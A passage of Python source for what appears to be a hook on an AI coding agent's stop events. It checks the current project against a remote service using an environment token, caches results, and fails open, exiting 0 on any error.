    # Guard 1 — this instance has already been asked once.
    if _blocked_already(state, key):
        return None, _outcome("not-checked:already-blocked"), key

    cwd = str(payload.get("cwd") or "")
    cached = _cached_binding(state, cwd) if cwd else None
    if cached is None:
        project, source, unbound = bind(cwd) if cwd else (None, "", "not-checked:unbound")
        _cache_binding(state, cwd, (project, source, unbound))
    else:
        project, source, unbound = cached

    if project is None:
        # ⚠️ THE HEARTBEAT IS `Stop`-ONLY, AND THAT IS LOAD-BEARING. On
        # `SubagentStop` it would multiply the unbound population by tree size —
        # nine calls per session in repositories that have not opted in.
        if unbound == "not-checked:unbound" and event == STOP:
            token = environ.get(TOKEN_ENV) or environ.get(TOKEN_ENV_FALLBACK)
            if not token:
                return None, _outcome("not-checked:no-credential"), ""
            status, _ = ask(token, None)
            return None, _outcome("not-checked:unbound"), f"heartbeat={status}"
        return None, _outcome(unbound), cwd

    token = environ.get(TOKEN_ENV) or environ.get(TOKEN_ENV_FALLBACK)
    if not token:
        return None, _outcome("not-checked:no-credential"), ""

    answer = _cached_answer(state, project, now)
    if answer is None:
        status, answer = ask(token, project)
        if status == 0:
            return None, _outcome("not-checked:network"), project
        if status != 200:
            return None, _outcome("not-checked:http", str(status)), project
        _cache_answer(state, project, answer, now)

    entries = answer.get("entries") or []
    if not entries:
        return None, _outcome("checked-clean"), project

    _remember_block(state, key)
    _drop_answer(state)
    return reason(answer, project, source, cwd), _outcome("blocked"), key


def main() -> int:
    """Read the payload, decide, print at most one object, and **always exit 0**.

    Exit 0 with no output is *"do not block"*. Every failure — a payload that is
    not JSON, a missing field, a disk error, an exception this file's author did
    not think of — lands in the `except BaseException` below and leaves by that
    door. There is exactly one line in this program that can block, and it is
    the `print` in the branch above it.
    """
    state = None
    try:
        raw = sys.stdin.read()
        try:
            payload = json.loads(raw)
        except ValueError:
            _record(None, _outcome("not-checked:bad-payload"), "unparseable stdin")
            return 0
        if not isinstance(payload, dict):
            _record(None, _outcome("not-checked:bad-payload"), "payload is not an object")
            return 0

        session_id = str(payload.get("session_id") or "")
        state = _state_dir(session_id) if session_id else None

        blocking_reason, outcome, note = decide(payload, os.environ, time.time())
        _record(state, outcome, note)

        if blocking_reason is not None:
            print(json.dumps({"decision": "block", "reason": blocking_reason}))
        return 0
    except BaseException as exc:  # noqa: BLE001 - see the docstring; this IS the control
        _record(state, _outcome("not-checked:internal-error"), type(exc).__name__)
        return 0


if __name__ == "__main__":
    sys.exit(main())
